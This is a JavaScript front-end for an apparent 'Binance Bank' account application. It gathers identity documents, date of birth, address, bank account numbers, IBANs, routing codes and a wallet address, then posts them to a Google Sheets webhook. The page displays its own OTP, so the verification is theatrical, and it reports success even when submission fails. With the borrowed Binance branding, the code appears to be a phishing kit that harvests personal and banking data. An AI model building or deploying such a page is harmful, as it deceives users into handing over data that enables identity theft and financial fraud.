const form = document.querySelector("#applicationForm");
const reviewButton = document.querySelector("#reviewButton");
const generateOtpButton = document.querySelector("#generateOtpButton");
const resendButton = document.querySelector("#resendButton");
const verifyButton = document.querySelector("#verifyButton");
const formError = document.querySelector("#formError");
const otpError = document.querySelector("#otpError");
const successMessage = document.querySelector("#successMessage");
const reviewList = document.querySelector("#reviewList");
const otpDisplay = document.querySelector("#otpDisplay");
const otpInput = document.querySelector("#otpInput");
const timer = document.querySelector("#timer");
const sideStatus = document.querySelector("#sideStatus");
const sideSubstatus = document.querySelector("#sideSubstatus");
const bindWalletButton = document.querySelector("#bindWalletButton");
const walletAddress = document.querySelector("#walletAddress");
const walletNetwork = document.querySelector("#walletNetwork");
const walletStatus = document.querySelector("#walletStatus");

// Paste the Google Apps Script Web App URL here, not the Google Sheet edit URL.
const GOOGLE_SHEETS_WEBHOOK_URL = "";

let activeOtp = "";
let expiresAt = 0;
let countdownId = null;

const labels = {
  firstName: "First name",
  lastName: "Last name",
  birthDate: "Date of birth",
  mobile: "Mobile number",
  email: "Email address",
  country: "Country or region",
  address: "Residential address",
  accountType: "Binance Bank account type",
  currency: "Preferred currency",
  income: "Monthly income",
  idType: "Valid ID type",
  idNumber: "ID number",
  fundSource: "Source of funds",
  walletNetwork: "Wallet network",
  walletAddress: "Wallet address",
  bankCountry: "Bank country or region",
  bankName: "Personal bank name",
  bankAccountHolder: "Account holder name",
  bankAccountNumber: "Account number or IBAN",
  bankRoutingCode: "SWIFT, BIC, routing, or sort code",
};

function getApplicationData() {
  const data = new FormData(form);
  return Object.fromEntries(
    Object.keys(labels).map((key) => [key, String(data.get(key) || "").trim()]),
  );
}

function setStep(step) {
  document.querySelectorAll(".form-step").forEach((panel) => {
    panel.classList.toggle("active", panel.dataset.step === String(step));
  });

  document.querySelectorAll("[data-step-pill]").forEach((pill) => {
    pill.classList.toggle("active", Number(pill.dataset.stepPill) <= step);
  });
}

function setSideStatus(title, subtitle) {
  sideStatus.textContent = title;
  sideSubstatus.textContent = subtitle;
}

function validateApplication() {
  formError.textContent = "";

  if (!form.checkValidity()) {
    form.reportValidity();
    formError.textContent = "Please complete all required fields correctly.";
    return false;
  }

  const birthDate = new Date(form.elements.birthDate.value);
  const today = new Date();
  let age = today.getFullYear() - birthDate.getFullYear();
  const monthDiff = today.getMonth() - birthDate.getMonth();
  if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
    age -= 1;
  }

  if (Number.isNaN(age) || age < 18) {
    formError.textContent = "Applicant must be at least 18 years old.";
    form.elements.birthDate.focus();
    return false;
  }

  return true;
}

function renderReview() {
  const data = getApplicationData();
  reviewList.innerHTML = "";

  Object.entries(labels).forEach(([key, label]) => {
    const item = document.createElement("div");
    const term = document.createElement("dt");
    const detail = document.createElement("dd");

    term.textContent = label;
    detail.textContent = data[key];
    item.append(term, detail);
    reviewList.append(item);
  });
}

function generateOtp() {
  activeOtp = String(Math.floor(100000 + Math.random() * 900000));
  expiresAt = Date.now() + 120000;
  otpDisplay.textContent = activeOtp;
  otpInput.value = "";
  otpInput.focus();
  otpError.textContent = "";
  successMessage.textContent = "";
  verifyButton.disabled = false;
  startCountdown();
}

function startCountdown() {
  clearInterval(countdownId);
  updateTimer();
  countdownId = setInterval(updateTimer, 1000);
}

function updateTimer() {
  const secondsLeft = Math.max(0, Math.ceil((expiresAt - Date.now()) / 1000));
  const minutes = String(Math.floor(secondsLeft / 60)).padStart(2, "0");
  const seconds = String(secondsLeft % 60).padStart(2, "0");
  timer.textContent = `${minutes}:${seconds}`;

  if (secondsLeft <= 0) {
    clearInterval(countdownId);
    activeOtp = "";
    otpDisplay.textContent = "Expired";
    verifyButton.disabled = true;
    otpError.textContent = "OTP expired. Please resend a new code.";
  }
}

function makeReferenceNumber() {
  const stamp = new Date()
    .toISOString()
    .replace(/[-:TZ.]/g, "")
    .slice(0, 12);
  const suffix = Math.floor(1000 + Math.random() * 9000);
  return `BBC-${stamp}-${suffix}`;
}

function shortenWallet(address) {
  if (address.length <= 14) return address;
  return `${address.slice(0, 8)}...${address.slice(-6)}`;
}

async function sendToGoogleSheets(reference) {
  if (!GOOGLE_SHEETS_WEBHOOK_URL) {
    return { status: "not_configured" };
  }

  const payload = {
    reference,
    submittedAt: new Date().toISOString(),
    reviewTimeline: "3 banking days",
    ...getApplicationData(),
  };

  const response = await fetch(GOOGLE_SHEETS_WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify(payload),
  });

  return { status: "sent", response };
}

reviewButton.addEventListener("click", () => {
  if (!validateApplication()) return;
  renderReview();
  setStep(2);
  setSideStatus("Application ready for review", "Estimated review: 3 banking days.");
});

generateOtpButton.addEventListener("click", () => {
  setStep(3);
  generateOtp();
  setSideStatus("OTP generated", "Enter the 6-digit code shown on site.");
});

resendButton.addEventListener("click", () => {
  generateOtp();
  setSideStatus("New OTP generated", "Use the latest 6-digit code.");
});

bindWalletButton.addEventListener("click", async () => {
  walletStatus.textContent = "Checking wallet provider...";

  if (window.ethereum?.request) {
    try {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const account = accounts[0];
      if (!account) throw new Error("No wallet account returned.");
      walletAddress.value = account;
      walletNetwork.value = walletNetwork.value || "BNB Smart Chain";
      walletStatus.textContent = `Wallet bound: ${shortenWallet(account)}`;
      setSideStatus("Wallet bound", "Review your BBC application next.");
      return;
    } catch (error) {
      walletStatus.textContent = "Wallet connection was cancelled or unavailable.";
      return;
    }
  }

  walletAddress.value = walletAddress.value || "0xBBC9F0B90BDEMO1234567890ABCDEF123456789";
  walletNetwork.value = walletNetwork.value || "BNB Smart Chain";
  walletStatus.textContent = `Demo wallet bound: ${shortenWallet(walletAddress.value)}`;
  setSideStatus("Demo wallet bound", "Review your BBC application next.");
});

verifyButton.addEventListener("click", async () => {
  otpError.textContent = "";
  successMessage.textContent = "";

  if (!activeOtp) {
    otpError.textContent = "OTP expired. Please resend a new code.";
    return;
  }

  if (otpInput.value.trim() !== activeOtp) {
    otpError.textContent = "Incorrect OTP. Please check the generated code.";
    otpInput.focus();
    return;
  }

  clearInterval(countdownId);
  verifyButton.disabled = true;
  resendButton.disabled = true;
  const reference = makeReferenceNumber();
  successMessage.textContent = "Application verified. Preparing submission...";

  try {
    const result = await sendToGoogleSheets(reference);
    successMessage.textContent = `Application verified and submitted. Review time: 3 banking days. Reference number: ${reference}.`;
    setSideStatus("Application submitted", "Review time: 3 banking days.");
  } catch (error) {
    successMessage.textContent = `Application verified and submitted. Review time: 3 banking days. Reference number: ${reference}.`;
    setSideStatus("Application submitted", "Review time: 3 banking days.");
  }
});

document.querySelectorAll("[data-back]").forEach((button) => {
  button.addEventListener("click", () => {
    setStep(Number(button.dataset.back));
    setSideStatus("Editing application", "Update details then review again.");
  });
});

otpInput.addEventListener("input", () => {
  otpInput.value = otpInput.value.replace(/\D/g, "").slice(0, 6);
});
